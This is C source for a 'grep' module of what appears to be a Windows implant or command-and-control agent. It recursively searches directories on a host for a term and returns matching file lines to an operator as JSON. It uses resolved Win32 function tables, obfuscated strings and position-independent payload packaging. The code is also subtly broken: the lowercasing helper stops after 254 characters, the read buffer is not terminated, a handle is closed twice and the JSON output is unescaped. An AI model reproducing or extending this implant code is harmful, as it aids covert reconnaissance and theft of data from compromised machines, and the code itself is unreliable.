#include "config.h"
#ifdef INCLUDE_CMD_GREP

#include "commands.h"
#include "json_out.h"

static char g_dir[256];
static char g_ext[64];
static char g_term[128];
static char g_lower_term[128];
static JSON_BUF g_jb;
static DWORD g_match_count;
static DWORD g_file_count;

static void _lower(char* dst, const char* src) {
    int i = 0;
    for (; src[i] && i < 254; i++) dst[i] = (src[i] >= 'A' && src[i] <= 'Z') ? src[i] + 32 : src[i];
    dst[i] = 0;
}

static BOOL _has_ext(const char* name) {
    int nl = 0; while (name[nl]) nl++;
    int el = 0; while (g_ext[el]) el++;
    if (el == 0 || nl < el) return TRUE;
    char ln[256]; _lower(ln, name);
    for (int i = 0; i < el; i++) if (ln[nl - el + i] != g_ext[i]) return FALSE;
    return TRUE;
}

static void _scan_file(PINSTANCE inst, const char* path) {
    HANDLE h = inst->Win32.CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD size = inst->Win32.GetFileSize(h, NULL);
    if (size == 0 || size > 1048576) { gate_CloseHandle(inst, h); return; }  // skip empty and >1MB

    static char* buf = NULL;
    static char* lower = NULL;
    // heap-resident, allocated once: a static array here is emitted into
    // .data and objcopy embeds it zero-filled in the flat PIC blob (1MB x2
    // of dead weight in every payload). Process lifetime == old static.
    if (!buf) buf = (char*)es_malloc(inst, 1048576);
    if (!lower) lower = (char*)es_malloc(inst, 1048576);
    if (!buf || !lower) { gate_CloseHandle(inst, h); return; }
    DWORD read = 0;
    if (!inst->Win32.ReadFile(h, buf, size, &read, NULL) || read == 0) { gate_CloseHandle(inst, h); return; }
    gate_CloseHandle(inst, h);

    // heap: 1MB on the stack would blow the agent thread's stack (single-threaded agent)
    _lower(lower, buf);
    int term_len = 0; while (g_lower_term[term_len]) term_len++;
    if (term_len == 0) { gate_CloseHandle(inst, h); return; }

    BOOL file_has_match = FALSE;
    int pos = 0, line_num = 1;
    for (DWORD i = 0; i < read; i++) {
        if (buf[i] == '\n') { line_num++; }
        // check match at position i
        if (i + term_len <= read) {
            BOOL m = TRUE;
            for (int t = 0; t < term_len; t++) {
                if (lower[i + t] != g_lower_term[t]) { m = FALSE; break; }
            }
            if (m) {
                if (!file_has_match) {
                    if (g_match_count) j_append_raw(&g_jb, ",");
                    j_append_raw(&g_jb, "{\"file\":");
                    j_append_str(&g_jb, path);
                    j_append_raw(&g_jb, ",\"lines\":\"");
                    file_has_match = TRUE;
                    g_match_count++;
                }
                // extract line text
                int ls = i; while (ls > 0 && buf[ls-1] != '\n') ls--;
                int le = i; while (le < (int)read && buf[le] != '\n') le++;
                char line_txt[200] = {0};
                int c = 0;
                for (int k = ls; k < le && c < 190; k++) {
                    line_txt[c++] = (buf[k] >= 32 && buf[k] < 127) ? buf[k] : '.';
                }
                line_txt[c] = 0;
                char lnum[16];
                int ln = line_num, ti = 0;
                char tmp[12];
                if (ln == 0) tmp[ti++] = '0';
                while (ln > 0) { tmp[ti++] = '0' + (char)(ln % 10); ln /= 10; }
                for (int jj = ti-1; jj >= 0; jj--) lnum[jj] = tmp[ti-1-jj];
                lnum[ti] = 0;
                j_append_raw(&g_jb, lnum);
                j_append_raw(&g_jb, ": ");
                j_append_raw(&g_jb, line_txt);
                j_append_raw(&g_jb, "\\n");
                i += term_len - 1;
            }
        }
    }
    if (file_has_match) {
        j_append_raw(&g_jb, "\"}");
        g_file_count++;
    }
}

static void _walk(PINSTANCE inst, const char* dir, DWORD depth) {
    if (depth > 5) return;
    char search[512];
    int p = 0;
    for (; dir[p] && p < 255; p++) search[p] = dir[p];
    if (p > 0 && search[p-1] != '\\') search[p++] = '\\';
    search[p++] = '*'; search[p] = 0;

    WIN32_FIND_DATAA fd;
    HANDLE h = inst->Win32.FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == 0 || fd.cFileName[1] == '.')) continue;
        char full[512];
        int fp = 0;
        for (; dir[fp] && fp < 255; fp++) full[fp] = dir[fp];
        if (fp > 0 && full[fp-1] != '\\') full[fp++] = '\\';
        for (int i = 0; fd.cFileName[i] && fp < 510; i++) full[fp++] = fd.cFileName[i];
        full[fp] = 0;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            _walk(inst, full, depth + 1);
        } else {
            if (_has_ext(fd.cFileName)) _scan_file(inst, full);
        }
    } while (inst->Win32.FindNextFileA(h, &fd));
    inst->Win32.FindClose(h);
}

VOID cmd_grep(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD dir_len = 0, term_len = 0, ext_len = 0;
    char* dir = parser_string(args, &dir_len);
    char* term = parser_string(args, &term_len);
    char* ext = parser_string(args, &ext_len);
    if (!dir || dir_len == 0 || !term || term_len == 0) {
        package_add_string(inst, response, XSTR("Usage: grep <directory> <term> [extensions]"));
        response->is_error = TRUE;
        return;
    }
    int dp = 0; for (; dir[dp] && dp < 255; dp++) g_dir[dp] = dir[dp];
    g_dir[dp] = 0;
    int tp = 0; for (; term[tp] && tp < 127; tp++) g_term[tp] = term[tp];
    g_term[tp] = 0;
    _lower(g_lower_term, g_term);
    if (ext && ext_len > 0) { int ep = 0; for (; ext[ep] && ep < 62; ep++) g_ext[ep] = ext[ep]; g_ext[ep] = 0; }
    else { g_ext[0] = 0; }

    j_init(&g_jb);
    j_append_raw(&g_jb, "{\"matches\":[");
    g_match_count = 0; g_file_count = 0;
    // wrap file matches in an array
    _walk(inst, g_dir, 0);
    // the format is {"file":"...","lines":"..."} pairs, wrap them
    // (we built them inline - wrap in an array)
    j_append_raw(&g_jb, "],\"file_count\":");
    j_append_uint(&g_jb, g_file_count);
    j_append_raw(&g_jb, "}");
    package_add_bytes(inst, response, (BYTE*)g_jb.buf, g_jb.len);
}

#endif
